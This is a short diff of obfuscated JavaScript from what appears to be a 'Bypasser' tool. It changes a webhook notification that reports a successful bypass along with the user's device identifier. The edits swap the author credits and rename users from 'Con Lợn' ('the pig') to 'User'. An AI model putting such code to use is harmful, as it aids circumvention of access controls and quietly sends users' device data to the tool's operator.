@@ -48,13 +48,13 @@
   }
   function _0x56597d(_0x17cd82, _0x3d146b, _0x520459) {
     const _0x4925ad = {
-      username: "Bypasser Notifi By HieuDz",
+      username: "Bypasser Notifi By vandung",
       avatar_url: "https://i.pinimg.com/736x/77/c9/0a/77c90a2b0c3a7d4a6a1ae22d5ac4238e.jpg",
       embeds: [{
-        title: "**Con Lợn Đã Bypass Thành Công**",
+        title: "**User Đã Bypass Thành Công**",
         color: 39423,
         fields: [{
-          name: "**Thiết Bị Con Lợn**",
+          name: "**Thiết Bị User**",
           value: "`" + _0x17cd82 + "`",
           inline: true
         }, {
@@ -67,7 +67,7 @@
           inline: false
         }],
         footer: {
-          text: "Bypasser System By BaoNgocCoder",
+          text: "Bypasser System By vandung",
           icon_url: "https://i.pinimg.com/736x/c3/66/df/c366df7cc91f1e3d67fc409db3042a42.jpg"
         },
         timestamp: new Date().toISOString()
